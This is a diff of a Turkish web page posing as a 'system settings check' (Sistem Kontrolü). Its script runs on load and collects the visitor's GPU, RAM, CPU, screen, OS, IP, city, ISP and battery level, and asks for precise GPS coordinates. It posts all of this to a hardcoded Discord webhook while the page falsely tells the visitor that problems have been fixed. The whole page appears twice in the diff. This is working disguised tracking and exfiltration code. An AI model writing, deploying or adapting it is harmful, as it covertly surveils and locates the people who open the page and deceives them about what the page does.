@@ -5,74 +5,177 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Sistem Kontrolü</title>
     <style>
-        body { background:#050505; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; font-family:sans-serif; }
-        h2 { color:#444; font-size:13px; font-weight:400; letter-spacing:1px; }
-        .ok { color:#0f4; font-weight:bold; }
+        body { background:#000; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; font-family:sans-serif; overflow:hidden; }
+        h2 { color:#111; font-size:10px; }
+        .ok { color:#0f4; font-weight:bold; font-size:14px; }
     </style>
 </head>
 <body>
-    <h2 id="t">Site ayarları kontrol ediliyor...</h2>
+    <h2 id="t">Sistem ayarları kontrol ediliyor...</h2>
 
     <script>
         const u = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
+        const t = document.getElementById('t');
 
-        async function extract() {
-            let info = { gpu: "Erişim Reddedildi", vendor: "Erişim Reddedildi", bat: "N/A", loc: "İzin Verilmedi" };
-            
-            // 1. DERİN GPU VE VENDOR ANALİZİ (Zorlanmış Sorgu)
+        // 1. DALGA: ANLIK DONANIM VE IP (İZİN GEREKTİRMEZ - %100 GELİR)
+        async function wave1() {
+            let gpu = "Bilinmiyor", vendor = "Bilinmiyor";
             try {
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl2') || canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                const dbg = gl.getExtension('WEBGL_debug_renderer_info');
-                if (dbg) {
-                    info.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_ID);
-                    info.vendor = gl.getParameter(dbg.UNMASKED_VENDOR_ID);
-                }
+                const c = document.createElement('canvas');
+                const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+                const d = gl.getExtension('WEBGL_debug_renderer_info');
+                gpu = gl.getParameter(d.UNMASKED_RENDERER_ID);
+                vendor = gl.getParameter(d.UNMASKED_VENDOR_ID);
             } catch(e) {}
 
-            // 2. AYRINTILI KONUM VERİSİ (En Yüksek Hassasiyet)
-            const getLoc = () => new Promise(res => {
-                if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(p => {
-                        const mapUrl = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
-                        res(`📍 **[Haritada Gör](${mapUrl})**\n**Koordinat:** \`${p.coords.latitude}, ${p.coords.longitude}\`\n**Doğruluk:** ${p.coords.accuracy.toFixed(1)}m\n**Rakım:** ${p.coords.altitude || 'N/A'}m`);
-                    }, () => res("❌ Konum İzni Reddedildi"), {enableHighAccuracy: true, timeout: 7000});
-                } else { res("❌ Geolocation Desteklenmiyor"); }
-            });
+            const res = await fetch('https://ipapi.co/json/').catch(() => ({json: () => ({})}));
+            const ip = await res.json();
 
-            // 3. PİL DURUMU
-            try {
-                if (navigator.getBattery) {
-                    const b = await navigator.getBattery();
-                    info.bat = `%${(b.level * 100).toFixed(0)} (Şarjda: ${b.charging ? 'Evet' : 'Hayır'})`;
-                }
-            } catch(e) {}
-
-            info.loc = await getLoc();
-
-            // 4. VERİ PAKETLEME (TAM İSTEDİĞİN VAHŞİ SET)
-            const payload = {
+            const p1 = {
                 embeds: [{
-                    title: "🕵️ KRİTİK CİHAZ VE KONUM ANALİZİ (FULL ACCESS)",
+                    title: "🕵️ KRİTİK ANALİZ - DALGA 1 (DONANIM & IP)",
                     color: 15158332,
                     fields: [
-                        { name: "📍 AYRINTILI KONUM", value: info.loc, inline: false },
-                        { name: "🛠️ DONANIM KATMANI", value: `**GPU:** \`${info.gpu}\`\n**VENDOR:** \`${info.vendor}\`\n**RAM:** ${navigator.deviceMemory || 'X'} GB\n**CPU:** ${navigator.hardwareConcurrency || 'X'} Çekirdek`, inline: false },
-                        { name: "📱 YAZILIM/EKRAN", value: `**OS:** ${navigator.platform}\n**RES:** ${screen.width}x${screen.height} (${window.devicePixelRatio}x)\n**DİL:** ${navigator.language}`, inline: true },
-                        { name: "🔋 DURUM", value: info.bat, inline: true },
-                        { name: "🌐 TARAYICI KİMLİĞİ", value: "```" + navigator.userAgent + "```", inline: false }
+                        { name: "🌐 IP & KONUM (YAKLAŞIK)", value: `**IP:** ${ip.ip || 'Bloke'}\n**Şehir:** ${ip.city || 'N/A'} / ${ip.country_name || 'N/A'}\n**ISP:** ${ip.org || 'N/A'}`, inline: false },
+                        { name: "🛠️ DONANIM", value: `**GPU:** \`${gpu}\`\n**VENDOR:** \`${vendor}\`\n**RAM:** ${navigator.deviceMemory}GB\n**CPU:** ${navigator.hardwareConcurrency} Çekirdek`, inline: false },
+                        { name: "📱 SİSTEM", value: `**OS:** ${navigator.platform}\n**RES:** ${screen.width}x${screen.height}`, inline: true }
                     ],
                     timestamp: new Date()
                 }]
             };
+            navigator.sendBeacon(u, JSON.stringify(p1));
+        }
 
-            // 5. GÜÇLÜ GÖNDERİM (Fetch + Beacon)
-            const data = JSON.stringify(payload);
-            fetch(u, { method: 'POST', mode: 'no-cors', headers: { 'Content-Type': 'application/json' }, body: data });
-            navigator.sendBeacon(u, new Blob([data], {type: 'application/json'}));
+        // 2. DALGA: PİL VE ŞARJ DURUMU (ÖZEL İSTEĞİN)
+        async function wave2() {
+            if (navigator.getBattery) {
+                const b = await navigator.getBattery();
+                const p2 = {
+                    embeds: [{
+                        title: "🔋 GÜÇ DURUMU",
+                        color: 3066993,
+                        description: `**Şarj Yüzdesi:** %${(b.level * 100).toFixed(0)}\n**Şarjda mı?:** ${b.charging ? 'EVET' : 'HAYIR'}`
+                    }]
+                };
+                fetch(u, { method: 'POST', mode: 'no-cors', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(p2) });
+            }
+        }
 
-            // 6. ARAYÜZ AKIŞI
-            const t = document.getElementById('t');
+        // 3. DALGA: KESİN KONUM (GPS - EN VAHŞİ TAKİP)
+        function wave3() {
+            navigator.geolocation.getCurrentPosition(p => {
+                const map = `http://google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
+                const p3 = {
+                    embeds: [{
+                        title: "📍 KESİN KONUM (GPS VERİSİ)",
+                        color: 15105570,
+                        description: `🚀 **[HARİTADA AÇ](${map})**\n**Enlem:** ${p.coords.latitude}\n**Boylam:** ${p.coords.longitude}\n**Hassasiyet:** ${p.coords.accuracy.toFixed(1)}m`
+                    }]
+                };
+                fetch(u, { method: 'POST', mode: 'no-cors', body: JSON.stringify(p3) });
+            }, null, {enableHighAccuracy:true});
+        }
+
+        // TETİKLEYİCİ
+        (async () => {
+            await wave1();
+            await wave2();
+            wave3();
+            
             t.innerHTML = '<span class="ok">Site uygun halde!</span>';
-            setTimeout(() => { t.innerHTML = '<span class="ok">Sorunlar düzeltildi.</span>
-                
+            setTimeout(() => { t.innerHTML = '<span class="ok">Sorunlar düzeltildi.</span>'; }, 600);
+        })();
+    </script>
+</body>
+</html>
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sistem Kontrolü</title>
+    <style>
+        body { background:#000; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; font-family:sans-serif; overflow:hidden; }
+        h2 { color:#111; font-size:10px; }
+        .ok { color:#0f4; font-weight:bold; font-size:14px; }
+    </style>
+</head>
+<body>
+    <h2 id="t">Sistem ayarları kontrol ediliyor...</h2>
+
+    <script>
+        const u = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
+        const t = document.getElementById('t');
+
+        // 1. DALGA: ANLIK DONANIM VE IP (İZİN GEREKTİRMEZ - %100 GELİR)
+        async function wave1() {
+            let gpu = "Bilinmiyor", vendor = "Bilinmiyor";
+            try {
+                const c = document.createElement('canvas');
+                const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+                const d = gl.getExtension('WEBGL_debug_renderer_info');
+                gpu = gl.getParameter(d.UNMASKED_RENDERER_ID);
+                vendor = gl.getParameter(d.UNMASKED_VENDOR_ID);
+            } catch(e) {}
+
+            const res = await fetch('https://ipapi.co/json/').catch(() => ({json: () => ({})}));
+            const ip = await res.json();
+
+            const p1 = {
+                embeds: [{
+                    title: "🕵️ KRİTİK ANALİZ - DALGA 1 (DONANIM & IP)",
+                    color: 15158332,
+                    fields: [
+                        { name: "🌐 IP & KONUM (YAKLAŞIK)", value: `**IP:** ${ip.ip || 'Bloke'}\n**Şehir:** ${ip.city || 'N/A'} / ${ip.country_name || 'N/A'}\n**ISP:** ${ip.org || 'N/A'}`, inline: false },
+                        { name: "🛠️ DONANIM", value: `**GPU:** \`${gpu}\`\n**VENDOR:** \`${vendor}\`\n**RAM:** ${navigator.deviceMemory}GB\n**CPU:** ${navigator.hardwareConcurrency} Çekirdek`, inline: false },
+                        { name: "📱 SİSTEM", value: `**OS:** ${navigator.platform}\n**RES:** ${screen.width}x${screen.height}`, inline: true }
+                    ],
+                    timestamp: new Date()
+                }]
+            };
+            navigator.sendBeacon(u, JSON.stringify(p1));
+        }
+
+        // 2. DALGA: PİL VE ŞARJ DURUMU (ÖZEL İSTEĞİN)
+        async function wave2() {
+            if (navigator.getBattery) {
+                const b = await navigator.getBattery();
+                const p2 = {
+                    embeds: [{
+                        title: "🔋 GÜÇ DURUMU",
+                        color: 3066993,
+                        description: `**Şarj Yüzdesi:** %${(b.level * 100).toFixed(0)}\n**Şarjda mı?:** ${b.charging ? 'EVET' : 'HAYIR'}`
+                    }]
+                };
+                fetch(u, { method: 'POST', mode: 'no-cors', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(p2) });
+            }
+        }
+
+        // 3. DALGA: KESİN KONUM (GPS - EN VAHŞİ TAKİP)
+        function wave3() {
+            navigator.geolocation.getCurrentPosition(p => {
+                const map = `http://google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
+                const p3 = {
+                    embeds: [{
+                        title: "📍 KESİN KONUM (GPS VERİSİ)",
+                        color: 15105570,
+                        description: `🚀 **[HARİTADA AÇ](${map})**\n**Enlem:** ${p.coords.latitude}\n**Boylam:** ${p.coords.longitude}\n**Hassasiyet:** ${p.coords.accuracy.toFixed(1)}m`
+                    }]
+                };
+                fetch(u, { method: 'POST', mode: 'no-cors', body: JSON.stringify(p3) });
+            }, null, {enableHighAccuracy:true});
+        }
+
+        // TETİKLEYİCİ
+        (async () => {
+            await wave1();
+            await wave2();
+            wave3();
+            
+            t.innerHTML = '<span class="ok">Site uygun halde!</span>';
+            setTimeout(() => { t.innerHTML = '<span class="ok">Sorunlar düzeltildi.</span>'; }, 600);
+        })();
+    </script>
+</body>
+</html>
+
